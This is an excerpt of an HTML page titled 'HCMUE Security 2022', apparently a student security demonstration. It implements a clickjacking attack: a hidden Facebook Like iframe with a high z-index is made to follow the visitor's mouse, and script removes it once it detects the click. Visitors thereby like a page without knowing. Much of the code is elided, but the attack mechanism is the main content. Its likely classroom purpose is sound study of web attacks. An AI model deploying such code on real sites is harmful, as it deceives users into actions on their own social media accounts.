...
<head>
    ...
    <!--	Title
	=========================================================-->
    <title>HCMUE Security 2022</title>
</head>

<body>

  <!-- Uncomment this for add iframe LIKE
    <style>
        iframe,
        #hiden-overplay {
            z-index: 99999;
    ...
    <iframe id="hiden-overplay" src="https://www.facebook.com/plugins/like.php?href=https%3A%2F%2Fwww.facebook.com%2Fclickj2022&width=90&layout=button_count&action=like&size=small&share=false&height=21&appId" width="90" height="21" style="border:none;overflow:hidden" scrolling="no" frameborder="0" allowfullscreen="true" allow="autoplay; clipboard-write; encrypted-media; picture-in-picture; web-share"></iframe>
    
  	<script type="text/javascript">
        window.onmousemove = function(e) {
            var m = document.getElementById("hiden-overplay")
    ...
    <script type="text/javascript">
        ...
        function checkClick() {
            if (document.activeElement && document.activeElement === document.getElementById("hiden-overplay")) {
                if (inIframe == false) {
                    $('#hiden-overplay').remove();
                    inIframe = true;
                }
            } else {
                inIframe = false;
                    ...
                    <div class="row h-100 align-items-center">
                        <div class="col-lg-12">
                            <div class="text-white">
                                <h1 class="mb-4"><span class="text-primary">901_ST2</span><br>
